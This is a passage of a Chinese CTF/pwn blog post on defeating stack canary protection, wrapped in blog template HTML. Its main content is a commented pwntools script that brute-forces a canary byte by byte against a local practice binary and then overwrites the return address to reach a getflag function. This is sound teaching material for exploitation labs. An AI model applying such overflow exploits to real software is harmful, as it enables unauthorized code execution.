+<h5 id="爆破exp分析"><a href="#爆破exp分析" class="headerlink" title="爆破exp分析"></a>爆破exp分析</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">name = <span class="string">&#x27;./pwn2&#x27;</span></span><br><span class="line">p = process(name)</span><br><span class="line">elf = ELF(name)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">canary = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):      <span class="comment">#爆破剩余的三个字节</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(i))       <span class="comment">#打印当前爆破的是第几个字节</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):   <span class="comment">#遍历0x00~0xff的256个可能的字节值</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(j))      <span class="comment">#打印当前字节值</span></span><br><span class="line">        <span class="comment">#开始尝试构造paylaod</span></span><br><span class="line">        p.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">100</span> + canary + <span class="built_in">chr</span>(j))</span><br><span class="line">        <span class="comment">#接收程序输出，判断是否爆破成功</span></span><br><span class="line">        a = p.recvuntil(<span class="string">&quot;welcome\n&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;recv&quot;</span> <span class="keyword">in</span> a: <span class="comment">#判断程序中是否包含recv，如果包含证明成功</span></span><br><span class="line">            canary += <span class="built_in">chr</span>(j) <span class="comment">#把争取的字节加入canary</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">canary = u32(canary)</span><br><span class="line">success(<span class="string">&quot;canary: &quot;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line">getflag = <span class="number">0x0804863B</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">100</span> + p32(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">12</span> + p32(getflag)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<blockquote>
+<p>更新: 2026-01-26 15:46:04<br>原文: <a target="_blank" rel="noopener" href="https://www.yuque.com/idcm/wnemg9/mzehwtf2avfgmeiw">https://www.yuque.com/idcm/wnemg9/mzehwtf2avfgmeiw</a></p>
+</blockquote>
+
+    </div>
+    <footer class="article-footer">
+      
+      
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+      <div class="article-nav-link-wrap left">
+            <img data-src="/HFTTC.github.io/images/banner.webp" data-sizes="auto" alt="绕过防御之击败PIE保护" class="lazyload">
+        <a href="/HFTTC.github.io/2026/04/28/PWN/PWNCTF/%E7%BB%95%E8%BF%87%E9%98%B2%E5%BE%A1%E4%B9%8B%E5%87%BB%E8%B4%A5PIE%E4%BF%9D%E6%8A%A4/" aria-label="前一篇: 绕过防御之击败PIE保护" title="前一篇: 绕过防御之击败PIE保护"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+            绕过防御之击败PIE保护
+        </h3>
+      </div>
+    <div class="article-nav-link-wrap right">
+          <img data-src="/HFTTC.github.io/images/banner.webp" data-sizes="auto" alt="简单栈溢出原理和攻击手段" class="lazyload">
+      <a href="/HFTTC.github.io/2026/04/28/PWN/PWNCTF/%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E5%92%8C%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5/" aria-label="后一篇: 简单栈溢出原理和攻击手段"  title="后一篇: 简单栈溢出原理和攻击手段"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+          简单栈溢出原理和攻击手段
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+        <span class="footer-info-sep rotate"></span>
+      SEZUVEM=
+    </div>
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        292.6k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        24:34
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E9%98%B2%E5%BE%A1%E4%B9%8B%E5%87%BB%E8%B4%A5canary%E4%BF%9D%E6%8A%A4"><span class="toc-number">1.</span> <span class="toc-text">绕过防御之击败canary保护</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#canary%E7%9A%84%E8%AE%A4%E8%AF%86%E5%92%8C%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">canary的认识和原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9-canary-%E7%9A%84%E7%AE%80%E5%8D%95%E5%8F%99%E8%BF%B0"><span class="toc-number">1.2.</span> <span class="toc-text">对 canary 的简单叙述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Canary-%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">1.3.</span> <span class="toc-text">Canary 的绕过方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Canary%E7%BB%95%E8%BF%87-%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toc-number">1.3.1.</span> <span class="toc-text">Canary绕过 方法一</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Canary2%E7%BB%95%E8%BF%87-%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toc-number">1.3.2.</span> <span class="toc-text">Canary2绕过 方法二</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#canary%E7%88%86%E7%A0%B4%E5%8E%9F%E7%90%86"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">canary爆破原理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#canary2exp"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">canary2exp</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%88%86%E7%A0%B4exp%E5%88%86%E6%9E%90"><span class="toc-number">1.3.2.3.</span> <span class="toc-text">爆破exp分析</span></a></li></ol></li></ol></li></ol></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="SEZUVEM=" class="lazyload">
+  <div class="sidebar-author-name">SEZUVEM=</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">198</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/HFTTC.github.io/js/script.js"></script>
+
+
+  
+<script src="/HFTTC.github.io/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/HFTTC.github.io/js/pjax_script.js" data-pjax></script>
+
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "SEZUVEM=",
+          title: "绕过防御之击败canary保护",
+          url: "https://idcm-svg.github.io/HFTTC.github.io/2026/04/28/PWN/PWNCTF/%E7%BB%95%E8%BF%87%E9%98%B2%E5%BE%A1%E4%B9%8B%E5%87%BB%E8%B4%A5canary%E4%BF%9D%E6%8A%A4/",
+          excerpt: "",
+          description: "",
+          stripContent: "绕过防御之击败canary保护canary的认识和原理函数在开始执行的时候会先往栈底插入 cookie 信息，当函数真正返回的时候会验证 cookie 信息是否合法，即栈帧销毁前测试该值是否被改动，如果不合法就停止运行。在 Linux 系统当中我们将这段 cookie 信息称为 Canary Canary 是一个低字节位 \x00 的十六进制数。 由于 Canary 在局部变量的后面，在 EBP 或 RBP 的前面，所以当攻击者覆盖返回地址的时候往往也会将 cookie 信息给覆盖掉，这就会导致",
+          date: "Tue Apr 28 2026 18:25:56 GMT+0800",
+          updated: "Tue Apr 28 2026 19:19:30 GMT+0800",
+          cover: "/HFTTC.github.io/images/banner.webp",
+        };
+      </script>
+        
+<script src="/HFTTC.github.io/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/HFTTC.github.io/js/tabs.js" data-pjax defer></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.3' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+  </body>
+  </html>
